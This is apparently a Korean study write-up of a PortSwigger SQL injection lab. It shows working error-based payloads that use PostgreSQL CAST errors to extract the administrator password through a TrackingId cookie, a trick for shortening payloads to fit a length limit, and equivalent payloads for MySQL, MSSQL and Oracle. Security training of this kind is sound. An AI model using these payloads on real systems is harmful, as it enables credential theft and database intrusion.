# Lab: Visible error-based SQL injection

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Visible Error-based
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
- **도구**: [tools/01-sqli-013-visible-error-based.py](../tools/01-sqli-013-visible-error-based.py)

## 목표

PostgreSQL CAST 타입 변환 에러를 유발하여 에러 메시지에 노출되는 값을 읽어 `administrator` 비밀번호를 추출하고 로그인한다.

## 이전 랩들과의 차이

| 항목 | 011 Conditional Responses | 012 Conditional Errors | 013 Visible Error-based |
|------|--------------------------|------------------------|-------------------------|
| 단서 | 응답 내용 차이 | HTTP 상태 코드 | 에러 메시지에 데이터 직접 노출 |
| 추출 방식 | 이진 탐색 (한 글자씩) | 이진 탐색 (한 글자씩) | **에러 메시지에서 직접 파싱** |
| 필요 요청 수 | ~140회 | ~140회 | **1~2회** |

## 풀이

### 1단계 — 취약점 및 에러 메시지 노출 확인

TrackingId에 `'`를 삽입하면 HTTP 500과 함께 SQL 에러 메시지가 응답에 그대로 노출된다.

```
TrackingId=ogAZZfxtOKUELbuJ'
```

에러 메시지에 **전체 쿼리 구조**가 드러난다. 이 시점에서 injection point가 단일 인용부호로 감싸진 문자열 안에 있음을 확인한다.

### 2단계 — CAST 에러로 데이터 추출 시도

SQL 타입 에러를 유발하면 변환하려던 값이 에러 메시지에 포함된다는 점을 활용한다.

```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```

→ 에러 발생. 응답을 보니 **쿼리문이 중간에 잘려** `--` 주석이 포함되지 않았다. TrackingId 원본값과 페이로드를 합친 길이가 서버의 문자 제한을 초과한 것이 원인이다.

```
[원본값 20자] + [페이로드 60자] → 제한 초과 → '--' 주석이 잘림 → 쿼리 문법 에러
```

`WHERE` 절을 사용하면 페이로드가 너무 길어지므로 다른 방법이 필요하다.

### 3단계 — LIMIT 1으로 우회, username 확인

`WHERE` 대신 `LIMIT 1`을 사용하면 페이로드 길이를 줄일 수 있다.

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

TrackingId 원본값도 제거하여 페이로드 길이를 최대한 확보했다.

→ 에러 메시지에 첫 번째 username이 노출된다.

```
ERROR: invalid input syntax for type integer: "administrator"
```

첫 번째 행이 `administrator`임을 확인했다.

### 4단계 — 동일한 방법으로 password 추출

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

→ 에러 메시지에 비밀번호가 노출된다.

```
ERROR: invalid input syntax for type integer: "실제비밀번호"
```

추출한 비밀번호로 `administrator` 로그인.

## 핵심 정리

- **SQL 타입 에러를 유발하면 변환 대상 값이 에러 메시지에 그대로 노출된다.** 이를 이용하면 이진 탐색 없이 데이터를 직접 추출할 수 있다.
- `AND CAST(...)` 단독으로는 boolean 타입 에러가 발생하므로 `AND 1=CAST(...)` 형태가 필요하다.
- 페이로드 길이가 서버 문자 제한을 초과하면 쿼리가 잘린다. TrackingId 원본값 제거와 `WHERE` → `LIMIT 1` 축약으로 해결했다.
- **방어**: 상세 에러 메시지 비활성화(운영 환경에서는 에러 내용을 클라이언트에 노출하지 않아야 한다), Prepared Statement 사용.

## 배운 점 및 추가 학습

### 1. 타입 에러가 데이터를 노출하는 원리

PostgreSQL은 `CAST` 타입 변환 실패 시 변환하려던 값을 에러 메시지에 포함한다.

```sql
SELECT CAST('secretpassword' AS int);
-- ERROR: invalid input syntax for type integer: "secretpassword"
```

서브쿼리로 원하는 데이터를 가져와 `CAST`에 집어넣으면 그 값이 에러 메시지로 노출된다.

```sql
SELECT 1=CAST((SELECT password FROM users LIMIT 1) AS int);
-- ERROR: invalid input syntax for type integer: "실제비밀번호"
```

이 원리는 Blind SQLi(011·012)와 달리 한 번의 요청으로 전체 값을 얻을 수 있어 훨씬 효율적이다.

### 2. 문자 제한 문제와 대응 전략

실제 환경에서도 파라미터 길이 제한은 자주 마주치는 제약이다.

| 상황 | 대응 |
|------|------|
| 원본값 + 페이로드 > 제한 | 원본값 제거 또는 최소화 |
| `WHERE username='administrator'` 가 너무 긺 | `LIMIT 1`로 대체 (첫 행이 타깃일 때) |
| 페이로드 자체가 길 때 | 공백 제거, 별칭 축약 등으로 단축 |

### 3. 에러 메시지가 단계별 힌트가 된다

이 랩의 풀이 흐름을 보면 에러 메시지가 다음 시도의 방향을 알려주는 역할을 한다.

```
' 삽입            → 에러 메시지에 쿼리 구조 노출    → injection point 파악
AND CAST(...)     → boolean 에러                  → 1=CAST(...)로 수정
WHERE 절 포함     → 쿼리 잘림 에러                 → LIMIT 1로 축약
LIMIT 1 username  → "administrator" 노출           → 첫 행이 타깃임 확인
LIMIT 1 password  → 비밀번호 노출                  → 완료
```

에러 메시지를 읽고 대응하는 반복적 접근이 핵심이다.

### 4. DBMS별 타입 에러 기반 추출 방법

| DBMS | 기법 | 예시 |
|------|------|------|
| PostgreSQL | `CAST(data AS int)` | `1=CAST((SELECT password FROM users LIMIT 1) AS int)` |
| MySQL | `EXTRACTVALUE()` | `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))` |
| MSSQL | `CONVERT()` | `CONVERT(int, (SELECT password FROM users))` |
| Oracle | `TO_NUMBER()` | `TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))` |

### 5. 추가로 고민해볼 것

- 에러 메시지가 HTML 렌더링되면 따옴표가 `&quot;`로 인코딩될 수 있어 파싱 시 두 가지 패턴 모두 처리해야 한다.
- 운영 환경에서는 에러 메시지가 숨겨져 있어 이 기법을 직접 쓸 수 없다. 하지만 개발·스테이징 서버나 설정 실수로 에러가 노출된 운영 서버에서는 매우 강력한 공격이 된다.
- `LIMIT 1`은 테이블의 첫 번째 행을 가져오므로 타깃이 첫 번째 행이 아닐 수 있다. 이 경우 `LIMIT 1 OFFSET N`으로 원하는 행을 지정할 수 있다.
